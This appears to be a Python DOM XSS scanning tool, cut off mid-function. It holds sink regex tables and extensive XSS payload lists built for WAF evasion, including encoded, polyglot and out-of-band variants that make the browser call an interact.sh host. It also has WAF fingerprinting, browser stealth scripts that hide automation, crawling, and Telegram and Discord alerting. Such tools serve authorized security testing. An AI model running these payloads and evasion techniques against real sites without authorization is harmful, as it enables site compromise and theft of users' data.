#!/usr/bin/env python3

import asyncio
import re
import sys
import json
import argparse
import hashlib
import base64
import requests
import yaml
import random
import string
from urllib.parse import quote, urljoin, urlparse, parse_qs
from typing import List, Dict, Optional, Set, Tuple
from datetime import datetime
from dataclasses import dataclass, asdict
from pathlib import Path
import logging
import time

from playwright.async_api import async_playwright
from aiohttp import ClientSession
from tqdm import tqdm
try:
    import openai
except ImportError:
    openai = None
from bs4 import BeautifulSoup

@dataclass
class SinkInfo:
    name: str
    pattern: str
    risk_level: int  # 1-5 scale
    execution_context: str
    mutation_observable: bool = False
    waf_evasion_difficulty: int = 1  # 1-5 scale

# Enhanced DOM sink patterns with comprehensive risk classification
SINKS = {
    # High-Risk Sinks (Code Execution)
    "eval": SinkInfo("eval", r"eval\s*\(", 5, "CODE_EXECUTION", False, 4),
    "Function": SinkInfo("Function", r"new\s+Function\s*\(", 5, "CODE_EXECUTION", False, 4),
    "execScript": SinkInfo("execScript", r"execScript\s*\(", 5, "CODE_EXECUTION", False, 5),
    "GenerateFunction": SinkInfo("GenerateFunction", r"GenerateFunction\s*\(", 5, "CODE_EXECUTION", False, 5),
    "constructor": SinkInfo("constructor", r"\.constructor\s*\(", 4, "CODE_EXECUTION", False, 4),
    
    # Document Write Sinks
    "document.write": SinkInfo("document.write", r"document\.write\s*\(", 5, "DOCUMENT_WRITE", True, 3),
    "document.writeln": SinkInfo("document.writeln", r"document\.writeln\s*\(", 5, "DOCUMENT_WRITE", True, 3),
    "document.open": SinkInfo("document.open", r"document\.open\s*\(", 4, "DOCUMENT_WRITE", True, 3),
    
    # DOM Write Sinks
    "innerHTML": SinkInfo("innerHTML", r"\.innerHTML\s*=", 4, "DOM_WRITE", True, 2),
    "outerHTML": SinkInfo("outerHTML", r"\.outerHTML\s*=", 4, "DOM_WRITE", True, 2),
    "insertAdjacentHTML": SinkInfo("insertAdjacentHTML", r"\.insertAdjacentHTML\s*\(", 4, "DOM_WRITE", True, 2),
    "insertAdjacentText": SinkInfo("insertAdjacentText", r"\.insertAdjacentText\s*\(", 3, "DOM_WRITE", True, 2),
    "insertAdjacentElement": SinkInfo("insertAdjacentElement", r"\.insertAdjacentElement\s*\(", 3, "DOM_WRITE", True, 2),
    "createContextualFragment": SinkInfo("createContextualFragment", r"\.createContextualFragment\s*\(", 3, "DOM_FRAGMENT", True, 2),
    "textContent": SinkInfo("textContent", r"\.textContent\s*=", 2, "DOM_WRITE", True, 1),
    "innerText": SinkInfo("innerText", r"\.innerText\s*=", 2, "DOM_WRITE", True, 1),
    
    # Timer Execution Sinks
    "setTimeout": SinkInfo("setTimeout", r"setTimeout\s*\(", 4, "TIMER_EXECUTION", False, 3),
    "setInterval": SinkInfo("setInterval", r"setInterval\s*\(", 4, "TIMER_EXECUTION", False, 3),
    "setImmediate": SinkInfo("setImmediate", r"setImmediate\s*\(", 4, "TIMER_EXECUTION", False, 3),
    "requestAnimationFrame": SinkInfo("requestAnimationFrame", r"requestAnimationFrame\s*\(", 3, "TIMER_EXECUTION", False, 2),
    
    # Event Handler Sinks
    "GlobalEventHandlers": SinkInfo("GlobalEventHandlers", r"on\w+\s*=", 4, "EVENT_HANDLER", True, 2),
    "addEventListener": SinkInfo("addEventListener", r"\.addEventListener\s*\(", 3, "EVENT_HANDLER", True, 2),
    "removeEventListener": SinkInfo("removeEventListener", r"\.removeEventListener\s*\(", 2, "EVENT_HANDLER", True, 1),
    
    # Navigation Sinks
    "location.href": SinkInfo("location.href", r"location\.href\s*=", 3, "NAVIGATION", False, 2),
    "location.assign": SinkInfo("location.assign", r"location\.assign\s*\(", 3, "NAVIGATION", False, 2),
    "location.replace": SinkInfo("location.replace", r"location\.replace\s*\(", 3, "NAVIGATION", False, 2),
    "location.reload": SinkInfo("location.reload", r"location\.reload\s*\(", 2, "NAVIGATION", False, 1),
    "location.pathname": SinkInfo("location.pathname", r"location\.pathname\s*=", 3, "NAVIGATION", False, 2),
    "location.search": SinkInfo("location.search", r"location\.search\s*=", 3, "NAVIGATION", False, 2),
    "location.hash": SinkInfo("location.hash", r"location\.hash\s*=", 3, "NAVIGATION", False, 2),
    "window.open": SinkInfo("window.open", r"window\.open\s*\(", 3, "NAVIGATION", False, 2),
    "window.location": SinkInfo("window.location", r"window\.location\s*=", 3, "NAVIGATION", False, 2),
    
    # History API Sinks
    "history.pushState": SinkInfo("history.pushState", r"history\.pushState\s*\(", 2, "HISTORY", False, 1),
    "history.replaceState": SinkInfo("history.replaceState", r"history\.replaceState\s*\(", 2, "HISTORY", False, 1),
    "history.go": SinkInfo("history.go", r"history\.go\s*\(", 2, "HISTORY", False, 1),
    "history.back": SinkInfo("history.back", r"history\.back\s*\(", 1, "HISTORY", False, 1),
    "history.forward": SinkInfo("history.forward", r"history\.forward\s*\(", 1, "HISTORY", False, 1),
    
    # DOM Manipulation Sinks
    "appendChild": SinkInfo("appendChild", r"\.appendChild\s*\(", 3, "DOM_MANIPULATION", True, 1),
    "replaceChild": SinkInfo("replaceChild", r"\.replaceChild\s*\(", 3, "DOM_MANIPULATION", True, 1),
    "insertBefore": SinkInfo("insertBefore", r"\.insertBefore\s*\(", 3, "DOM_MANIPULATION", True, 1),
    "removeChild": SinkInfo("removeChild", r"\.removeChild\s*\(", 2, "DOM_MANIPULATION", True, 1),
    "cloneNode": SinkInfo("cloneNode", r"\.cloneNode\s*\(", 2, "DOM_MANIPULATION", True, 1),
    "replaceWith": SinkInfo("replaceWith", r"\.replaceWith\s*\(", 3, "DOM_MANIPULATION", True, 1),
    "insertAdjacentElement": SinkInfo("insertAdjacentElement", r"\.insertAdjacentElement\s*\(", 3, "DOM_MANIPULATION", True, 2),
    
    # Attribute Manipulation Sinks
    "setAttribute": SinkInfo("setAttribute", r"\.setAttribute\s*\(", 3, "ATTRIBUTE_WRITE", True, 2),
    "setAttributeNS": SinkInfo("setAttributeNS", r"\.setAttributeNS\s*\(", 3, "ATTRIBUTE_WRITE", True, 2),
    "setAttributeNode": SinkInfo("setAttributeNode", r"\.setAttributeNode\s*\(", 3, "ATTRIBUTE_WRITE", True, 2),
    "setNamedItem": SinkInfo("setNamedItem", r"\.setNamedItem\s*\(", 3, "ATTRIBUTE_WRITE", True, 2),
    
    # jQuery/Library Sinks
    "jQuery.html": SinkInfo("jQuery.html", r"\$\([^)]*\)\.html\s*\(", 4, "JQUERY_DOM", True, 2),
    "jQuery.append": SinkInfo("jQuery.append", r"\$\([^)]*\)\.append\s*\(", 3, "JQUERY_DOM", True, 2),
    "jQuery.prepend": SinkInfo("jQuery.prepend", r"\$\([^)]*\)\.prepend\s*\(", 3, "JQUERY_DOM", True, 2),
    "jQuery.after": SinkInfo("jQuery.after", r"\$\([^)]*\)\.after\s*\(", 3, "JQUERY_DOM", True, 2),
    "jQuery.before": SinkInfo("jQuery.before", r"\$\([^)]*\)\.before\s*\(", 3, "JQUERY_DOM", True, 2),
    "jQuery.replaceWith": SinkInfo("jQuery.replaceWith", r"\$\([^)]*\)\.replaceWith\s*\(", 3, "JQUERY_DOM", True, 2),
    "jQuery.wrap": SinkInfo("jQuery.wrap", r"\$\([^)]*\)\.wrap\s*\(", 3, "JQUERY_DOM", True, 2),
    "jQuery.wrapAll": SinkInfo("jQuery.wrapAll", r"\$\([^)]*\)\.wrapAll\s*\(", 3, "JQUERY_DOM", True, 2),
    "jQuery.wrapInner": SinkInfo("jQuery.wrapInner", r"\$\([^)]*\)\.wrapInner\s*\(", 3, "JQUERY_DOM", True, 2),
    
    # Message/Communication Sinks
    "postMessage": SinkInfo("postMessage", r"\.postMessage\s*\(", 3, "MESSAGE", False, 2),
    "MessageChannel": SinkInfo("MessageChannel", r"new\s+MessageChannel\s*\(", 2, "MESSAGE", False, 2),
    "BroadcastChannel": SinkInfo("BroadcastChannel", r"new\s+BroadcastChannel\s*\(", 2, "MESSAGE", False, 2),
    
    # Security Context Sinks
    "document.domain": SinkInfo("document.domain", r"document\.domain\s*=", 4, "SECURITY_CONTEXT", False, 3),
    "document.cookie": SinkInfo("document.cookie", r"document\.cookie\s*=", 3, "SECURITY_CONTEXT", False, 2),
    
    # Storage Sinks
    "localStorage.setItem": SinkInfo("localStorage.setItem", r"localStorage\.setItem\s*\(", 2, "STORAGE", False, 1),
    "sessionStorage.setItem": SinkInfo("sessionStorage.setItem", r"sessionStorage\.setItem\s*\(", 2, "STORAGE", False, 1),
    
    # Import/Module Sinks
    "import": SinkInfo("import", r"import\s*\(", 4, "MODULE_LOAD", False, 3),
    "importScripts": SinkInfo("importScripts", r"importScripts\s*\(", 4, "MODULE_LOAD", False, 3),
    
    # CSS Manipulation Sinks
    "style.cssText": SinkInfo("style.cssText", r"\.style\.cssText\s*=", 3, "CSS_MANIPULATION", True, 2),
    "insertRule": SinkInfo("insertRule", r"\.insertRule\s*\(", 3, "CSS_MANIPULATION", True, 2),
    "addRule": SinkInfo("addRule", r"\.addRule\s*\(", 3, "CSS_MANIPULATION", True, 2),
    
    # WebGL/Canvas Sinks
    "getContext": SinkInfo("getContext", r"\.getContext\s*\(", 2, "CANVAS", False, 1),
    
    # Range/Selection Sinks
    "createRange": SinkInfo("createRange", r"\.createRange\s*\(", 2, "RANGE", True, 1),
    "surroundContents": SinkInfo("surroundContents", r"\.surroundContents\s*\(", 3, "RANGE", True, 2),
    "insertNode": SinkInfo("insertNode", r"\.insertNode\s*\(", 3, "RANGE", True, 2),
    
    # Form Manipulation Sinks
    "formData.append": SinkInfo("formData.append", r"formData\.append\s*\(", 2, "FORM", False, 1),
    "form.submit": SinkInfo("form.submit", r"\.submit\s*\(", 2, "FORM", False, 1),
    
    # Parser Sinks
    "DOMParser.parseFromString": SinkInfo("DOMParser.parseFromString", r"parseFromString\s*\(", 3, "PARSER", True, 2),
    "XMLHttpRequest.responseXML": SinkInfo("XMLHttpRequest.responseXML", r"\.responseXML", 2, "PARSER", True, 1),
    
    # Template Sinks
    "template.innerHTML": SinkInfo("template.innerHTML", r"template\.innerHTML\s*=", 4, "TEMPLATE", True, 2),
    
    # WebRTC/Media Sinks
    "createObjectURL": SinkInfo("createObjectURL", r"createObjectURL\s*\(", 2, "MEDIA", False, 1),
    "revokeObjectURL": SinkInfo("revokeObjectURL", r"revokeObjectURL\s*\(", 1, "MEDIA", False, 1),
    
    # Crypto Sinks (potential for timing attacks)
    "crypto.subtle": SinkInfo("crypto.subtle", r"crypto\.subtle\.", 2, "CRYPTO", False, 1),
    
    # Service Worker Sinks
    "navigator.serviceWorker.register": SinkInfo("navigator.serviceWorker.register", r"serviceWorker\.register\s*\(", 3, "SERVICE_WORKER", False, 2),
    
    # Notification Sinks
    "Notification": SinkInfo("Notification", r"new\s+Notification\s*\(", 2, "NOTIFICATION", False, 1),
    
    # Geolocation Sinks
    "getCurrentPosition": SinkInfo("getCurrentPosition", r"getCurrentPosition\s*\(", 2, "GEOLOCATION", False, 1),
    "watchPosition": SinkInfo("watchPosition", r"watchPosition\s*\(", 2, "GEOLOCATION", False, 1)
}

# Advanced XSS payloads with comprehensive WAF evasion and context-aware testing
PAYLOADS = {
    "basic": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>"
    ],
    "waf_evasion": [
        "<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
        "<svg/onload=window[atob('YWxlcnQ=')](1)>",
        "<iframe srcdoc='<script>parent.alert(1)</script>'>",
        "<details ontoggle=alert`1`>",
        "<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path onmouseover=alert(1)>",
        "<img src=x onerror=window['al'+'ert']('WAF_BYPASS')>",
        "<svg><script>eval('al'+'ert(1)')</script></svg>",
        "<img src=x onerror=Function('al'+'ert(1)')()>",
        "<svg onload=setTimeout('al'+'ert(1)',1)>",
        "<img src=x onerror=this['al'+'ert']('BYPASS')>",
        "<script>/*!alert*/alert(1)</script>",
        "<script>var/**/a=alert;a(1)</script>",
        "<img src=x onerror=\u0061lert(1)>",
        "<svg onload=\u0061lert(1)>",
        "<iframe src=\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006c\u0065\u0072\u0074(1)>",
        "<img src=x onerror='alert&#40;1&#41;'>",
        "<svg onload='alert&#x28;1&#x29;'>",
        "<img src=x onerror=alert(String.fromCharCode(49))>",
        "<script>eval('\\x61lert(1)')</script>",
        "<img src=1 onerror=alert(/XSS/.source)>",
        "<svg onload=alert(atob('MQ=='))>"
    ],
    "context_specific": {
        "innerHTML": [
            "<img src=x onerror=alert('innerHTML')>",
            "<svg onload=alert('innerHTML')>",
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<object data='data:text/html,<script>alert(1)</script>'></object>",
            "<embed src='data:text/html,<script>alert(1)</script>'>",
            "<marquee onstart=alert('innerHTML')>",
            "<details open ontoggle=alert('innerHTML')>",
            "<audio src onerror=alert('innerHTML')>"
        ],
        "eval": [
            "alert('eval_context')",
            "1;alert('eval');1",
            "(function(){alert('eval')})();",
            "throw alert('eval')",
            "with(alert)eval('eval(1)')",
            "[][constructor]['constructor']('alert(1)')();",
            "''['constructor']['constructor']('alert(1)')();",
            "(()=>alert('eval'))();"
        ],
        "setTimeout": [
            "alert('setTimeout')",
            "(function(){alert('timer')})();",
            "Function('alert(1)')();",
            "eval('alert(1)');",
            "with(alert)setTimeout('timer(1)',1);"
        ],
        "location": [
            "javascript:alert('location')",
            "data:text/html,<script>alert(1)</script>",
            "javascript:void(alert('location'))",
            "javascript://comment%0aalert(1)",
            "javascript:/*comment*/alert(1)",
            "jAvAsCrIpT:alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
        ],
        "setAttribute": [
            "javascript:alert('setAttribute')",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:alert('setAttribute')",
            "javascript:void(alert('setAttribute'))",
            "javascript://comment%0aalert(1)"
        ],
        "document.write": [
            "<img src=x onerror=alert('document.write')>",
            "<script>alert('document.write')</script>",
            "<svg onload=alert('document.write')>",
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<object data='javascript:alert(1)'></object>",
            "<embed src='javascript:alert(1)'>"
        ],
        "jQuery.html": [
            "<img src=x onerror=alert('jQuery')>",
            "<svg onload=alert('jQuery')>",
            "<script>alert('jQuery')</script>",
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<object data='data:text/html,<script>alert(1)</script>'></object>"
        ]
    },
    "mutation_observer": [
        "<div id='test123'><script>alert('mutation')</script></div>",
        "<span data-test='<script>alert(1)</script>'></span>",
        "<p class='<img src=x onerror=alert(1)>'></p>",
        "<div style='<img src=x onerror=alert(1)>'></div>",
        "<section><script>alert('mutation')</script></section>",
        "<article><img src=x onerror=alert('mutation')></article>",
        "<header><svg onload=alert('mutation')></header>",
        "<footer><iframe srcdoc='<script>alert(1)</script>'></footer>"
    ],
    "advanced_bypass": [
        # Template literals
        "<img src=x onerror=alert`1`>",
        "<svg onload=alert`XSS`>",
        # Unicode normalization
        "<img src=x onerror=ａｌｅｒｔ('XSS')>",
        # CSS expression (IE)
        "<div style='background:url(javascript:alert(1))'>",
        # Data URI with base64
        "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>",
        # SVG with embedded script
        "<svg><script xlink:href='data:text/javascript,alert(1)'></script></svg>",
        # WebGL context
        "<canvas id=c><script>c.getContext('webgl');alert(1)</script></canvas>",
        # Form action
        "<form action='javascript:alert(1)'><input type=submit></form>",
        # Meta refresh
        "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
        # Link import
        "<link rel=import href='data:text/html,<script>alert(1)</script>'>",
        # Shadow DOM
        "<div id=host></div><script>host.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>'</script>"
    ],
    "polyglot": [
        # Polyglot payloads that work in multiple contexts
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/*/`/*\\x3csvg/onload=*/alert(1)//'>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "\"'><img src=x onerror=alert('XSS')>//",
        "</script><svg/onload=alert('XSS')>",
        "';}</style><svg onload=alert('XSS')>//"
    ]
}

# Interact.sh integration payloads for OOB detection
INTERACTSH_PAYLOADS = [
    "<script src='http://{domain}/xss.js'></script>",
    "<img src='http://{domain}/img.png'>",
    "<iframe src='http://{domain}/frame.html'></iframe>",
    "fetch('http://{domain}/data')",
    "<link rel=prefetch href='http://{domain}/prefetch'>",
    "<object data='http://{domain}/object.swf'></object>",
    "<embed src='http://{domain}/embed.swf'>",
    "<video src='http://{domain}/video.mp4'></video>",
    "<audio src='http://{domain}/audio.mp3'></audio>",
    "<script>navigator.sendBeacon('http://{domain}/beacon', 'xss')</script>",
    "<script>new Image().src='http://{domain}/img.png'</script>",
    "<style>@import 'http://{domain}/style.css';</style>",
    "<script>import('http://{domain}/module.js')</script>",
    "<meta http-equiv=refresh content='1;url=http://{domain}/redirect'>",
    "<form action='http://{domain}/form' method=post><input type=hidden name=xss value=1></form>",
    "<script>fetch('http://{domain}/fetch', {method:'POST', body:'xss=1'})</script>",
    "<script>new XMLHttpRequest().open('GET','http://{domain}/xhr');xhr.send()</script>",
    "<svg><image href='http://{domain}/svg.png'></image></svg>",
    "<script>document.domain;location='http://{domain}/domain'</script>",
    "<script>WebSocket('ws://{domain}/ws')</script>"
]

# WAF signatures for detection
WAF_SIGNATURES = {
    "cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
    "aws_waf": ["x-amzn-requestid", "x-amz-cf-id"],
    "akamai": ["ak-user-agent", "akamai-ghost"],
    "incapsula": ["x-iinfo", "incap_ses"],
    "sucuri": ["x-sucuri-id", "sucuri"],
    "barracuda": ["barra", "x-barracuda"],
    "f5": ["f5-x-forwarded-for", "bigip"],
    "fortinet": ["fortigate", "x-fortigate"],
}

@dataclass
class ScanResult:
    url: str
    sinks: List[str]
    risk_score: float
    execution_context: str
    mutation_observed: bool = False
    waf_detected: Optional[str] = None
    interactsh_triggered: bool = False
    nuclei_template: Optional[str] = None
    timestamp: str = ""
    crawl_depth: int = 0
    ai_analysis: Dict = None

class AIContextClassifier:
    def __init__(self, api_key: Optional[str] = None):
        self.api_key = api_key
        if api_key and openai:
            openai.api_key = api_key
    
    async def classify_dom_context(self, html_content: str, js_content: str) -> Dict:
        """Use AI to classify DOM context and predict XSS likelihood"""
        if not self.api_key or not openai:
            return {"classification": "unknown", "confidence": 0.0, "context_hints": [], "risk_level": 1}
        
        try:
            prompt = f"""Analyze this web page content for DOM XSS vulnerabilities:
            
HTML: {html_content[:2000]}...
JavaScript: {js_content[:2000]}...
            
Provide analysis in this JSON format:
{{
  "risk_level": 1-5,
  "classification": "safe|low_risk|medium_risk|high_risk|critical",
  "confidence": 0.0-1.0,
  "context_hints": ["list", "of", "indicators"],
  "vulnerable_patterns": ["patterns", "found"],
  "recommended_payloads": ["payload", "types"]
}}"""
            
            response = await openai.ChatCompletion.acreate(
                model="gpt-3.5-turbo",
                messages=[{"role": "user", "content": prompt}],
                max_tokens=500
            )
            
            return json.loads(response.choices[0].message.content)
        except Exception as e:
            logging.warning(f"AI classification failed: {e}")
            return {"classification": "error", "confidence": 0.0, "context_hints": [], "risk_level": 1}

class InteractshClient:
    def __init__(self):
        self.base_url = "https://interact.sh"
        self.session = None
        self.domain = None
    
    async def get_domain(self) -> Optional[str]:
        """Get a unique interact.sh domain"""
        try:
            async with ClientSession() as session:
                async with session.get(f"{self.base_url}/register") as resp:
                    data = await resp.json()
                    self.domain = data.get("domain")
                    return self.domain
        except Exception as e:
            logging.warning(f"Failed to get interact.sh domain: {e}")
            return None
    
    async def check_interactions(self, domain: str) -> List[Dict]:
        """Check for interactions on the domain"""
        try:
            async with ClientSession() as session:
                async with session.get(f"{self.base_url}/poll?domain={domain}") as resp:
                    return await resp.json()
        except Exception as e:
            logging.warning(f"Failed to check interactions: {e}")
            return []

class NotificationManager:
    def __init__(self, telegram_token: Optional[str] = None, discord_webhook: Optional[str] = None):
        self.telegram_token = telegram_token
        self.discord_webhook = discord_webhook
    
    async def send_telegram(self, message: str, chat_id: str = None):
        """Send Telegram notification"""
        if not self.telegram_token:
            return
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            data = {
                "chat_id": chat_id or "@xss_alerts",
                "text": message,
                "parse_mode": "Markdown"
            }
            
            async with ClientSession() as session:
                await session.post(url, json=data)
        except Exception as e:
            logging.error(f"Telegram notification failed: {e}")
    
    async def send_discord(self, message: str):
        """Send Discord notification"""
        if not self.discord_webhook:
            return
        
        try:
            data = {"content": message}
            async with ClientSession() as session:
                await session.post(self.discord_webhook, json=data)
        except Exception as e:
            logging.error(f"Discord notification failed: {e}")

class CrawlerEngine:
    def __init__(self, max_depth: int = 3, max_urls: int = 100):
        self.max_depth = max_depth
        self.max_urls = max_urls
        self.visited_urls = set()
        self.found_urls = set()
    
    async def extract_urls(self, page, base_url: str) -> Set[str]:
        """Extract URLs from the current page"""
        try:
            urls = await page.evaluate("""
                () => {
                    const links = Array.from(document.querySelectorAll('a[href]'));
                    const forms = Array.from(document.querySelectorAll('form[action]'));
                    
                    const hrefs = links.map(a => a.href).filter(Boolean);
                    const actions = forms.map(f => f.action).filter(Boolean);
                    
                    return [...hrefs, ...actions];
                }
            """)
            
            parsed_base = urlparse(base_url)
            valid_urls = set()
            
            for url in urls:
                try:
                    parsed = urlparse(url)
                    # Only include same-origin URLs
                    if parsed.netloc == parsed_base.netloc and url not in self.visited_urls:
                        valid_urls.add(url)
                        if len(valid_urls) >= self.max_urls:
                            break
                except:
                    continue
            
            return valid_urls
        except Exception as e:
            logging.debug(f"URL extraction failed: {e}")
            return set()

class NucleiTemplateGenerator:
    @staticmethod
    def generate_template(scan_result: ScanResult) -> str:
        """Generate a Nuclei template for the finding"""
        template_id = hashlib.md5(scan_result.url.encode()).hexdigest()[:8]
        
        template = {
            "id": f"dom-xss-{template_id}",
            "info": {
                "name": f"DOM XSS in {urlparse(scan_result.url).netloc}",
                "author": "domsink_scanner",
                "severity": "high" if scan_result.risk_score >= 80 else "medium",
                "description": f"DOM XSS vulnerability detected with risk score {scan_result.risk_score}",
                "reference": [scan_result.url],
                "tags": "xss,dom,javascript"
            },
            "requests": [
                {
                    "method": "GET",
                    "path": [f"/{urlparse(scan_result.url).path}?test={{xss_payload}}"],
                    "headers": {
                        "User-Agent": "Mozilla/5.0 (compatible; Nuclei)"
                    },
                    "matchers": [
                        {
                            "type": "word",
                            "words": ["<script>", "onerror=", "javascript:"],
                            "condition": "or"
                        }
                    ]
                }
            ]
        }
        
        return yaml.dump(template, default_flow_style=False)

class DOMSinkScanner:
    def __init__(self, headless: bool = True, timeout: int = 30000, 
                 ai_api_key: Optional[str] = None, use_interactsh: bool = False,
                 telegram_token: Optional[str] = None, discord_webhook: Optional[str] = None,
                 max_crawl_depth: int = 3, enable_crawling: bool = False):
        self.headless = headless
        self.timeout = timeout
        self.results = []
        self.ai_classifier = AIContextClassifier(ai_api_key)
        self.interactsh = InteractshClient() if use_interactsh else None
        self.notifications = NotificationManager(telegram_token, discord_webhook)
        self.crawler = CrawlerEngine(max_crawl_depth) if enable_crawling else None
        self.crawled_urls = set()
        self.max_crawl_depth = max_crawl_depth
        
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    def calculate_risk_score(self, sinks_found: List[str], context_data: Dict, mutation_observed: bool = False) -> float:
        """Calculate risk score based on sinks found and context"""
        base_score = 0.0
        
        for sink_name in sinks_found:
            if sink_name in SINKS:
                sink_info = SINKS[sink_name]
                base_score += sink_info.risk_level * 2
        
        # AI context multiplier
        ai_confidence = context_data.get("confidence", 0.0)
        ai_risk = context_data.get("risk_level", 1)
        
        context_multiplier = 1.0 + (ai_confidence * ai_risk * 0.1)
        
        # Mutation observer bonus
        if mutation_observed:
            context_multiplier += 0.2
        
        # Normalize to 0-100 scale
        final_score = min(100.0, base_score * context_multiplier)
        return round(final_score, 2)
    
    async def detect_waf(self, url: str) -> Optional[str]:
        """Detect WAF presence"""
        import aiohttp
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with ClientSession(timeout=timeout) as session:
                # Send a suspicious request to trigger WAF
                test_payload = "<script>alert('waf_test')</script>"
                test_url = f"{url}?test={quote(test_payload)}"
                async with session.get(test_url) as resp:
                    headers = dict(resp.headers)
                    content = await resp.text()
                    for waf_name, signatures in WAF_SIGNATURES.items():
                        for signature in signatures:
                            if any(signature.lower() in str(v).lower() for v in headers.values()) or \
                               signature.lower() in content.lower():
                                return waf_name
                    # Check for common WAF response patterns
                    if resp.status in [403, 406, 429] and len(content) < 1000:
                        return "generic_waf"
        except Exception as e:
            logging.debug(f"WAF detection failed for {url}: {e}")
        return None
    
    async def setup_mutation_observer(self, page) -> str:
        """Setup MutationObserver to detect DOM changes"""
        observer_script = """
        window.mutationResults = [];
        window.sinkTriggers = [];
        
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === 1) { // Element node
                            // Check for dangerous content
                            const content = node.innerHTML || node.outerHTML || '';
                            if (content.includes('<script') || 
                                content.includes('javascript:') || 
                                content.includes('onerror=') ||
                                content.includes('onload=')) {
                                window.mutationResults.push({
                                    type: 'dangerous_content',
                                    content: content.substring(0, 200),
                                    timestamp: Date.now()
                                });
                            }
                        }
                    });
                }
                
                if (mutation.type === 'attributes') {
                    const attrValue = mutation.target.getAttribute(mutation.attributeName);
                    if (attrValue && (
                        attrValue.includes('javascript:') ||
                        attrValue.includes('<script') ||
                        mutation.attributeName.startsWith('on')
                    )) {
                        window.mutationResults.push({
                            type: 'dangerous_attribute',
                            attribute: mutation.attributeName,
                            value: attrValue.substring(0, 100),
                            timestamp: Date.now()
                        });
                    }
                }
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true,
            attributes: true,
            attributeOldValue: true
        });
        
        // Monitor sink function calls
        const originalInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
        if (originalInnerHTML) {
            Object.defineProperty(Element.prototype, 'innerHTML', {
                set: function(value) {
                    window.sinkTriggers.push({
                        sink: 'innerHTML',
                        value: value.substring(0, 200),
                        timestamp: Date.now(),
                        element: this.tagName
                    });
                    return originalInnerHTML.set.call(this, value);
                },
                get: originalInnerHTML.get
            });
        }
        
        const originalEval = window.eval;
        window.eval = function(code) {
            window.sinkTriggers.push({
                sink: 'eval',
                value: code.substring(0, 200),
                timestamp: Date.now()
            });
            return originalEval.call(this, code);
        };
        
        'MutationObserver setup complete';
        """
        
        return await page.evaluate(observer_script)
    
    async def get_mutation_results(self, page) -> Dict:
        """Get results from MutationObserver"""
        try:
            results = await page.evaluate("""
                () => ({
                    mutations: window.mutationResults || [],
                    sinkTriggers: window.sinkTriggers || []
                })
            """)
            return results
        except Exception as e:
            logging.debug(f"Failed to get mutation results: {e}")
            return {"mutations": [], "sinkTriggers": []}
    
    async def send_notification(self, result: ScanResult):
        """Send high-risk finding notifications"""
        message = f"""🚨 **High-Risk DOM XSS Detected**

**URL:** {result.url}
**Risk Score:** {result.risk_score}/100
**Sinks Found:** {', '.join(result.sinks)}
**WAF:** {result.waf_detected or 'None'}
**Mutation Observed:** {'Yes' if result.mutation_observed else 'No'}
**Timestamp:** {result.timestamp}
"""
        
        await self.notifications.send_telegram(message)
        await self.notifications.send_discord(message)
    
    def generate_nuclei_template(self, result: ScanResult) -> str:
        """Generate Nuclei template for the finding"""
        return NucleiTemplateGenerator.generate_template(result)
    
    async def scan_dom_sinks(self, url: str, crawl_depth: int = 0) -> Optional[ScanResult]:
        """Enhanced scan with MutationObserver, AI classification, and comprehensive detection"""
        try:
            # Detect WAF first
            waf_detected = await self.detect_waf(url)
            if waf_detected:
                print(f"[!] WAF detected: {waf_detected} on {url}")
            
            async with async_playwright() as p:
                # Enhanced browser setup with evasion
                browser = await p.chromium.launch(
                    headless=True,  # Force headless mode
                    args=[
                        '--disable-blink-features=AutomationControlled',
                        '--disable-dev-shm-usage',
                        '--no-sandbox',
                        '--disable-setuid-sandbox',
                        '--disable-web-security',
                        '--disable-features=VizDisplayCompositor',
                        '--headless=new',  # Ensure headless mode
                        '--disable-gpu',
                        '--disable-software-rasterizer'
                    ]
                )
                
                context = await browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    viewport={"width": 1920, "height": 1080},
                    locale="en-US",
                    timezone_id="America/New_York",
                    ignore_https_errors=True
                )
                
                # Add stealth scripts
                await context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined,
                    });
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['en-US', 'en'],
                    });
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3, 4, 5],
                    });
                """)
                
                page = await context.new_page()
                
